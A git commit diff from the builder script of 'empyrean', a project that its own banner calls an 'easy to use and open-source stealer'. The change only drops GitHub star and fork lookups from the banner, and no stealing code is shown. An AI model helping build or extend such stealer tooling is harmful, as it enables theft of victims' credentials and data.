73858ba7b00adba3e8b1a4209a68c6d71aeaafe8
addi00000 <81730200+addi00000@users.noreply.github.com>
2024-04-14 16:59:10 -0400

    fix: remove stargazer count from builder
    Error with fetching stars for some users. Probably a rate limit of some kind.

--- builder/main.py
+++ builder/main.py
@@ -14,11 +14,6 @@ from util.writeconfig import WriteConfig
 
 
 def main():
-    stars = requests.get(
-        f"https://api.github.com/repos/addi00000/empyrean").json()["stargazers_count"]
-    forks = requests.get(
-        f"https://api.github.com/repos/addi00000/empyrean").json()["forks_count"]
-
     logging.basicConfig(
         level="NOTSET",
         format="%(message)s",
@@ -32,7 +27,7 @@ def main():
 
     console.print(pyfiglet.figlet_format("empyrean", font="graffiti"),
                   justify="center", highlight=False, style="magenta", overflow="ignore")
-    console.print(f"Easy to use and open-source stealer.\nStars: {stars} | Forks: {forks}",
+    console.print(f"Easy to use and open-source stealer.",
                   justify="center", highlight=False, style="bold magenta", overflow="ignore")
 
     config = Config()
